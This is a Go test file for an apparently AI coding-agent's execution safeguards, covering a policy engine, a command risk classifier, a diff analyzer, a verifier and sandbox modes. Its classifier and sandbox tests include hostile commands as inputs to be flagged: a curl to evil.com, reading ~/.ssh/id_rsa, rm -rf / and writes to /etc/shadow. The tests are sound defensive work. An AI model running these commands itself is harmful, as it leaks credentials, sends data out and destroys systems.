package execution

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/PizenLabs/izen/internal/git"
	"github.com/PizenLabs/izen/internal/modes"
)

func TestPolicyEngineAllowsKnownCapability(t *testing.T) {
	pe := NewPolicyEngine(func() modes.Capability {
		return modes.CapRead | modes.CapWrite
	})

	dec := pe.Check(CapWorkspaceRead)
	if !dec.Allowed {
		t.Fatalf("expected workspace.read to be allowed, got: %s", dec.Reason)
	}

	dec = pe.Check(CapWorkspaceWrite)
	if !dec.Allowed {
		t.Fatalf("expected workspace.write to be allowed, got: %s", dec.Reason)
	}
}

func TestPolicyEngineDeniesRestrictedCapability(t *testing.T) {
	pe := NewPolicyEngine(func() modes.Capability {
		return modes.CapRead | modes.CapWrite | modes.CapShell
	})

	dec := pe.Check(CapFilesystemHome)
	if dec.Allowed {
		t.Fatal("expected filesystem.home to be denied")
	}
	if !dec.Restricted {
		t.Fatal("expected restricted flag")
	}

	dec = pe.Check(CapSudoExecute)
	if dec.Allowed {
		t.Fatal("expected sudo.execute to be denied")
	}
	if !dec.Restricted {
		t.Fatal("expected restricted flag")
	}
}

func TestPolicyEngineDefaultDeny(t *testing.T) {
	pe := NewPolicyEngine(func() modes.Capability {
		return modes.CapRead
	})

	dec := pe.Check("unknown.capability")
	if dec.Allowed {
		t.Fatal("expected unknown capability to be denied by default")
	}
	if !dec.Unknown {
		t.Fatal("expected unknown flag")
	}
}

func TestPolicyEngineDeniesWhenModeMissing(t *testing.T) {
	pe := NewPolicyEngine(func() modes.Capability {
		return modes.CapRead // no CapWrite
	})

	dec := pe.Check(CapWorkspaceWrite)
	if dec.Allowed {
		t.Fatal("expected workspace.write to be denied in read-only mode")
	}
}

func TestPolicyEngineMust(t *testing.T) {
	pe := NewPolicyEngine(func() modes.Capability {
		return modes.CapRead | modes.CapWrite
	})

	if err := pe.Must(CapWorkspaceRead); err != nil {
		t.Fatalf("Must(workspace.read) should not error: %v", err)
	}

	if err := pe.Must(CapFilesystemHome); err == nil {
		t.Fatal("Must(filesystem.home) should error")
	}

	if err := pe.Must(CapNetworkExternal); err == nil {
		t.Fatal("Must(network.external) should error")
	}
}

func TestRiskClassifierLowRiskCommand(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("go test ./...")
	if result.Level != RiskLow {
		t.Fatalf("expected Low risk, got %s", result.Label)
	}
}

func TestRiskClassifierCriticalRiskCommand(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("rm -rf /var/log")
	if result.Level < RiskHigh {
		t.Fatalf("expected High/Critical risk for destructive command, got %s", result.Label)
	}
}

func TestRiskClassifierNetworkRisk(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("curl http://evil.com/steal")
	if result.Level < RiskMedium {
		t.Fatalf("expected at least Medium risk for network command, got %s", result.Label)
	}
}

func TestRiskClassifierCredentialAccess(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyCommand("cat ~/.ssh/id_rsa")
	if result.Level < RiskHigh {
		t.Fatalf("expected High/Critical risk for credential access, got %s", result.Label)
	}
}

func TestRiskClassifierFileOpSystemPath(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyFileOp("/etc/passwd", false)
	if result.Level < RiskMedium {
		t.Fatalf("expected at least Medium risk for system path, got %s", result.Label)
	}
}

func TestRiskClassifierFileOpSafe(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyFileOp("internal/foo/bar.go", true)
	if result.Level != RiskLow {
		t.Fatalf("expected Low risk for workspace file, got %s", result.Label)
	}
}

func TestRiskClassifierPatch(t *testing.T) {
	rc := NewRiskClassifier()
	result := rc.ClassifyPatch(&Patch{File: "main.go"})
	if result.Level != RiskLow {
		t.Fatalf("expected Low risk for main.go patch, got %s", result.Label)
	}

	result = rc.ClassifyPatch(&Patch{File: "/etc/shadow"})
	if result.Level < RiskMedium {
		t.Fatalf("expected at least Medium risk for /etc/shadow, got %s", result.Label)
	}
}

func TestDiffAnalyzerBasicFunctions(t *testing.T) {
	da := NewDiffAnalyzer()
	original := `package foo

func Hello() string {
	return "world"
}

func internalHelper() int {
	return 42
}
`
	modified := `package foo

func Hello() string {
	return "hello"
}

func internalHelper() int {
	return 99
}

func NewFunc() bool {
	return true
}
`
	report := da.AnalyzeContent("foo/bar.go", original, modified)
	if report.TotalFilesModified != 1 {
		t.Fatalf("expected 1 file modified, got %d", report.TotalFilesModified)
	}
	if len(report.AffectedFunctions) == 0 {
		t.Fatal("expected affected functions")
	}

	found := false
	for _, f := range report.AffectedFunctions {
		if f.Name == "NewFunc" && f.ChangeType == "added" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("expected NewFunc to be detected as added")
	}
}

func TestDiffAnalyzerPublicAPIDetection(t *testing.T) {
	da := NewDiffAnalyzer()
	report := da.AnalyzeContent("bar.go", "", `package bar

func ExportedFunc() {}
`)
	if !report.PublicAPIChanged {
		t.Fatal("expected PublicAPIChanged for new exported function")
	}
}

func TestDiffAnalyzerPatches(t *testing.T) {
	da := NewDiffAnalyzer()
	patches := []StagedPatch{
		{File: "internal/auth/jwt.go", Content: "package auth\n\nfunc Validate() bool {\n\treturn true\n}\n"},
		{File: "internal/auth/middleware.go", Content: "package auth\n\ntype Config struct {\n\tSecret string\n}\n"},
	}

	report := da.AnalyzePatches(patches)
	if len(report.ModifiedPackages) != 1 || report.ModifiedPackages[0] != "internal/auth" {
		t.Fatalf("expected internal/auth package, got %v", report.ModifiedPackages)
	}
	if len(report.AffectedFunctions) == 0 {
		t.Fatal("expected affected functions")
	}
}

func TestVerifierDefaultSteps(t *testing.T) {
	v := NewVerifier(".")
	if len(v.steps) != len(defaultVerificationSteps) {
		t.Fatalf("expected %d default steps, got %d", len(defaultVerificationSteps), len(v.steps))
	}
}

func TestVerifierCustomSteps(t *testing.T) {
	v := NewVerifier(".")
	custom := []VerificationStep{
		{Name: "echo", Command: "echo hello", Optional: false},
	}
	v.SetCustomSteps(custom)

	report := v.RunAll()
	if len(report.Results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(report.Results))
	}
	if !report.Results[0].Passed {
		t.Fatalf("echo should pass, got: %s", report.Results[0].Error)
	}
}

func TestVerifierCustomStepsFailure(t *testing.T) {
	v := NewVerifier(".")
	custom := []VerificationStep{
		{Name: "fail", Command: "exit 1", Optional: false},
	}
	v.SetCustomSteps(custom)

	report := v.RunAll()
	if report.Passed {
		t.Fatal("expected verification to fail")
	}
	if len(report.Results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(report.Results))
	}
	if report.Results[0].Passed {
		t.Fatal("expected step to fail")
	}
}

func TestVerifierOptionalFailure(t *testing.T) {
	v := NewVerifier(".")
	custom := []VerificationStep{
		{Name: "optional-fail", Command: "exit 1", Optional: true},
		{Name: "pass", Command: "echo ok", Optional: false},
	}
	v.SetCustomSteps(custom)

	report := v.RunAll()
	if !report.Passed {
		t.Fatal("optional step failure should not cause overall failure")
	}
}

func TestPipelineExecuteBuild(t *testing.T) {
	dir := t.TempDir()
	_ = os.MkdirAll(filepath.Join(dir, ".git"), 0755)

	r := NewRunner(dir, false, false)
	pe := NewPolicyEngine(func() modes.Capability { return modes.CapRead | modes.CapWrite | modes.CapShell | modes.CapTest })
	rc := NewRiskClassifier()
	v := NewVerifier(dir)
	d := NewDiffAnalyzer()

	engine := &Engine{
		Runner:   r,
		Policy:   pe,
		Risk:     rc,
		Verifier: v,
		Diff:     d,
		Git:      git.NewEngine(dir),
		root:     dir,
		Patches:  NewPatchManager(dir),
	}
	engine.Pipeline = NewPipelineRunner(engine)

	patches := []StagedPatch{
		{File: "main.go", Content: "package main\n\nfunc main() {}\n"},
	}

	result := engine.Pipeline.ExecuteBuild(patches)
	if !result.Passed {
		t.Fatalf("pipeline should pass for simple change, got report:\n%s", result.Report)
	}
}

func TestPipelineBlocksRestrictedCap(t *testing.T) {
	dir := t.TempDir()

	pe := NewPolicyEngine(func() modes.Capability { return modes.CapRead })
	engine := &Engine{
		Policy: pe,
		Git:    git.NewEngine(dir),
		root:   dir,
	}
	engine.Pipeline = NewPipelineRunner(engine)

	patches := []StagedPatch{
		{File: "/etc/shadow", Content: "root:x:0:0:root"},
	}

	result := engine.Pipeline.ExecuteBuild(patches)
	for _, s := range result.Stages {
		if s.Name == "Capability & Policy Engine" && s.Status == "blocked" {
			return
		}
	}
	t.Fatalf("expected pipeline to be blocked by policy, got:\n%s", result.Report)
}

func TestPipelineReportFormat(t *testing.T) {
	dir := t.TempDir()

	engine := &Engine{
		Policy:  NewPolicyEngine(func() modes.Capability { return modes.CapRead | modes.CapWrite }),
		Git:     git.NewEngine(dir),
		root:    dir,
		Runner:  NewRunner(dir, false, false),
		Risk:    NewRiskClassifier(),
		Patches: NewPatchManager(dir),
	}
	engine.Pipeline = NewPipelineRunner(engine)

	patches := []StagedPatch{
		{File: "test.go", Content: "package test\n"},
	}

	result := engine.Pipeline.ExecuteBuild(patches)
	if !strings.Contains(result.Report, "Izen Execution Pipeline") {
		t.Fatalf("report missing header: %s", result.Report)
	}
	if !strings.Contains(result.Report, "Capability & Policy Engine") {
		t.Fatalf("report missing policy stage: %s", result.Report)
	}
	if !strings.Contains(result.Report, "Structural Diff Analysis") {
		t.Fatalf("report missing diff stage: %s", result.Report)
	}
	if !strings.Contains(result.Report, "Risk Classification") {
		t.Fatalf("report missing risk stage: %s", result.Report)
	}
}

func TestDiffReportString(t *testing.T) {
	report := DiffReport{
		ModifiedPackages:  []string{"internal/auth"},
		PublicAPIChanged:  false,
		SchemaChanges:     false,
		AffectedFunctions: []AffectedFunction{{Name: "Login", Package: "internal/auth", Exported: true, ChangeType: "modified"}},
	}

	str := report.String()
	if !strings.Contains(str, "internal/auth") {
		t.Fatalf("report should contain package name")
	}
	if !strings.Contains(str, "Login") {
		t.Fatalf("report should contain function name")
	}
	if !strings.Contains(str, "Public API") {
		t.Fatalf("report should have Public API section")
	}
	if !strings.Contains(str, "Database") {
		t.Fatalf("report should have Database section")
	}
}

func TestPipelineExecuteEmptyPatches(t *testing.T) {
	dir := t.TempDir()
	_ = os.MkdirAll(filepath.Join(dir, ".git"), 0755)

	engine := &Engine{
		Policy: NewPolicyEngine(func() modes.Capability { return modes.CapRead | modes.CapWrite }),
		Git:    git.NewEngine(dir),
		root:   dir,
		Runner: NewRunner(dir, false, false),
		Risk:   NewRiskClassifier(),
		Diff:   NewDiffAnalyzer(),
	}
	engine.Pipeline = NewPipelineRunner(engine)

	result := engine.Pipeline.ExecuteBuild(nil)
	if !result.Passed {
		t.Fatalf("empty patches should pass pipeline, got: %s", result.Report)
	}
}

func TestRunnerSandboxPolicyMode(t *testing.T) {
	r := NewRunner(".", true, false)
	r.SetSandboxMode(SandboxPolicy)
	r.SetRiskClassifier(NewRiskClassifier())

	if err := r.SandboxCheck("echo safe"); err != nil {
		t.Fatalf("safe command should pass policy sandbox: %v", err)
	}

	if err := r.SandboxCheck("rm -rf /"); err == nil {
		t.Fatal("dangerous command should be blocked by policy sandbox")
	}
}

func TestRunnerSandboxHighRiskOnlyMode(t *testing.T) {
	r := NewRunner(".", true, false)
	r.SetSandboxMode(SandboxHighRisk)
	r.SetRiskClassifier(NewRiskClassifier())

	if err := r.SandboxCheck("echo safe"); err != nil {
		t.Fatalf("safe command should pass high-risk sandbox: %v", err)
	}

	if err := r.SandboxCheck("rm -rf /"); err == nil {
		t.Fatal("dangerous command should be blocked by high-risk sandbox")
	}
}

func TestRunnerSandboxDisabled(t *testing.T) {
	r := NewRunner(".", false, false)
	r.SetSandboxMode(SandboxDisabled)

	if err := r.SandboxCheck("rm -rf /"); err != nil {
		t.Fatalf("disabled sandbox should allow everything: %v", err)
	}
}

func TestRunnerSandboxAllMode(t *testing.T) {
	r := NewRunner(".", true, false)
	r.SetSandboxMode(SandboxAll)

	if err := r.SandboxCheck("echo hi"); err == nil {
		t.Fatal("all mode should block every command")
	}
}
